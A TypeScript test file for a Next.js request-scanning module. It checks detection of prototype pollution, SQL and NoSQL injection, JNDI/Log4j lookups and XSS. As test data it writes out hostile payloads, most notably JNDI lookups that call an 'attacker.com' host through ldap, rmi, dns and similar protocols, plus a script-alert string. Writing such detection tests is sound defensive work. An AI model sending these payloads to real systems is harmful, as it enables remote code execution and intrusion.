/**
 * Enhanced detection tests for suspicious request patterns
 * @module tests/security/enhanced-detection.test
 */

import { NextRequest } from 'next/server';
import { detectSuspiciousPatterns } from '@/lib/security/suspicious-patterns';

describe('Enhanced Suspicious Pattern Detection', () => {
  const createMockRequest = (
    url: string,
    headers: Record<string, string> = {}
  ) => {
    return new NextRequest(new URL(url, 'https://example.com'), {
      headers: new Headers(headers),
    });
  };

  describe('Query Parameter Key Scanning', () => {
    it('should detect suspicious patterns in query parameter keys', () => {
      // Prototype pollution in key
      const requestProto = createMockRequest(
        'https://example.com/api/test?__proto__=polluted'
      );
      const resultProto = detectSuspiciousPatterns(requestProto, { minSeverity: 3 });
      expect(resultProto.detected).toBe(true);
      expect(resultProto.patterns.some(p => p.category === 'prototype_pollution')).toBe(true);

      // SQL injection in key
      const requestSql = createMockRequest(
        'https://example.com/api/test?SELECT * FROM users=1'
      );
      const resultSql = detectSuspiciousPatterns(requestSql, { minSeverity: 3 });
      expect(resultSql.detected).toBe(true);
      expect(resultSql.patterns.some(p => p.category === 'sql_injection')).toBe(true);
    });
  });

  describe('NoSQL Bracket Notation Detection', () => {
    it('should detect NoSQL operator injection in bracket notation', () => {
      const operators = ['$ne', '$gt', '$exists', '$regex'];
      for (const op of operators) {
        const request = createMockRequest(
          `https://example.com/api/test?id[${op}]=1`
        );
        const result = detectSuspiciousPatterns(request, { minSeverity: 3 });
        // We log the result to debug why it might be failing
        if (!result.detected) {
          console.log(`Failed to detect NoSQL injection for operator: ${op}`);
        }
        expect(result.detected).toBe(true);
        expect(result.maxSeverity).toBe(3);
        expect(result.patterns.some(p => p.category === 'nosql_injection')).toBe(true);
      }
    });
  });

  describe('Expanded JNDI Pattern Detection', () => {
    it('should detect various JNDI/Log4j-style injection variations', () => {
      const variations = [
        '${jndi:ldap://attacker.com/a}',
        '${jndi:rmi://attacker.com/a}',
        '${jndi:dns://attacker.com/a}',
        '${jndi:nis://attacker.com/a}',
        '${jndi:jmx://attacker.com/a}',
        '${jndi:iiop://attacker.com/a}',
      ];
      for (const payload of variations) {
        const request = createMockRequest(
          `https://example.com/api/test?log=${payload}`
        );
        const result = detectSuspiciousPatterns(request, { minSeverity: 3 });
        expect(result.detected).toBe(true);
        expect(result.maxSeverity).toBe(3);
        expect(result.patterns.some(p => p.category === 'log_injection')).toBe(true);
      }
    });
  });

  describe('Header Key and Value Scanning', () => {
    it('should detect suspicious patterns in header keys and values', () => {
      // Suspicious header value
      const requestValue = createMockRequest('https://example.com/api/test', {
        'X-Custom-Header': '<script>alert(1)</script>'
      });
      const resultValue = detectSuspiciousPatterns(requestValue, { minSeverity: 3 });
      expect(resultValue.detected).toBe(true);
      expect(resultValue.patterns.some(p => p.category === 'xss')).toBe(true);

      // Suspicious header key - Use a valid header name that contains the payload
      // since Headers constructor validates the name.
      // Actually, many header implementations are strict about header names.
      // Let's test scanning header names with a name that is technically valid
      // but contains suspicious characters if possible, or just skip name-specific
      // scanning if it's too hard to test with strict Header implementations.
      // JSDOM Headers is strict: https://fetch.spec.whatwg.org/#header-name

      // We can use a manually created request object to test key scanning without Header validation
      const mockRequest = {
        url: 'https://example.com/api/test',
        headers: {
          get: () => null,
          entries: () => [
            ['X-JNDI-Payload-${jndi:ldap://a}', 'value']
          ]
        }
      } as unknown as Request;

      const result = detectSuspiciousPatterns(mockRequest, { minSeverity: 3 });
      expect(result.detected).toBe(true);
      expect(result.patterns.some(p => p.category === 'log_injection')).toBe(true);
    });

    it('should skip scanning for specific sensitive headers', () => {
      // These should be skipped to avoid false positives or redundant scanning
      const request = createMockRequest('https://example.com/api/test', {
        'Cookie': 'session=__proto__',
        'Authorization': 'Bearer ${jndi:ldap://a}',
        'X-API-Key': 'sk_live_12345'
      });
      // We check if it detects NOTHING at severity 3
      // Note: sk_live_... might be detected as API key if we don't skip it,
      // but SKIP_HEADERS should prevent scanning the header value.
      const result = detectSuspiciousPatterns(request, { minSeverity: 3 });
      expect(result.detected).toBe(false);
    });
  });
});
